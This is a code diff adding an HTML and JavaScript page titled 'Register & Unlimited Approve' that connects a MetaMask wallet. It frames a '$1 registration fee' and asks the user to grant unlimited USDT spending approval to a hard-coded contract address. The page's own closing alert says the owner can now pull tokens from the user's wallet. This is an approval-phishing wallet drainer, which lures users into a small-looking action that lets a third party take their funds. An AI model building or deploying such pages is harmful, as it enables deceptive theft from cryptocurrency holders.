@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Register & Unlimited Approve</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 50px auto; text-align: center; background-color: #f4f7f6; }
+    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+    button { padding: 12px 24px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 8px; border: none; transition: 0.3s; }
+    #connectBtn { background-color: #2196F3; color: white; }
+    #registerBtn { background-color: #4CAF50; color: white; }
+    button:disabled { background-color: #ccc; cursor: not-allowed; }
+    pre { background: #2d2d2d; color: #00ff00; padding: 15px; height: 200px; overflow-y: auto; border-radius: 5px; text-align: left; font-size: 13px; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2>Wallet Dashboard</h2>
+  <p>Register fee: 1$ + Unlimited Allowance</p>
+
+  <button id="connectBtn">1. Connect Wallet</button><br>
+  <button id="registerBtn" disabled>2. Approve & Register</button>
+
+  <pre id="log">Waiting for connection...</pre>
+</div>
+
+<script>
+  // --- Configuration ---
+  const WALLET_MANAGER = "0xe06704C5f5Dbb1A6BceccA3446DBb8d475AfaE9a"; 
+  const TOKEN = "0x55d398326f99059fF775485246999027B3197955"; // USDT/BUSD Address
+
+  const ERC20_ABI = [
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ];
+
+  const WALLET_MANAGER_ABI = [
+    "function register() external",
+    "function registrationFee() view returns (uint256)"
+  ];
+
+  let provider, signer, userAddress, tokenContract, walletManagerContract;
+
+  const logEl = document.getElementById("log");
+  const connectBtn = document.getElementById("connectBtn");
+  const registerBtn = document.getElementById("registerBtn");
+
+  function log(msg) {
+    logEl.textContent += `\n> ${msg}`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  connectBtn.onclick = async () => {
+    if (!window.ethereum) return alert("MetaMask install karein!");
+    try {
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+      
+      tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
+      walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
+
+      log(`Connected: ${userAddress}`);
+      registerBtn.disabled = false;
+      connectBtn.innerText = "Wallet Connected ✅";
+    } catch (err) {
+      log("Connection Error: " + err.message);
+    }
+  };
+
+  registerBtn.onclick = async () => {
+    try {
+      registerBtn.disabled = true;
+      log("Step 1: Unlimited Allowance mang rahe hain...");
+
+      // 1. Pehle Unlimited Allowance mangna (Zaroori hai taaki register fee cut sake)
+      const maxUint = ethers.constants.MaxUint256;
+      let currentAllowance = await tokenContract.allowance(userAddress, WALLET_MANAGER);
+      
+      // Agar allowance fee se kam hai (maan lijiye 1$ se kam), toh approval trigger karein
+      if (currentAllowance.lt(ethers.utils.parseUnits("1", 18))) { // Adjust decimals based on token
+          log("Approval transaction bhej rahe hain...");
+          let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
+          log(`Approve Hash: ${txApprove.hash}`);
+          await txApprove.wait();
+          log("✅ Unlimited Allowance Approved!");
+      } else {
+          log("✅ Allowance pehle se hi kaafi hai.");
+      }
+
+      // 2. Ab Register karna (Isme user ke wallet se 1$ fee katega)
+      log("Step 2: WalletManager mein register kar rahe hain (1$ Fee)...");
+      let txRegister = await walletManagerContract.register();
+      log(`Register Hash: ${txRegister.hash}`);
+      
+      await txRegister.wait();
+      log("✅ Registration Successful!");
+      alert("Success! Ab owner aapke wallet se tokens pull kar sakta hai.");
+
+    } catch (error) {
+      log("❌ Error: " + (error.data?.message || error.message));
+      console.error(error);
+    } finally {
+      registerBtn.disabled = false;
+    }
+  };
+</script>
+
+</body>
+</html>
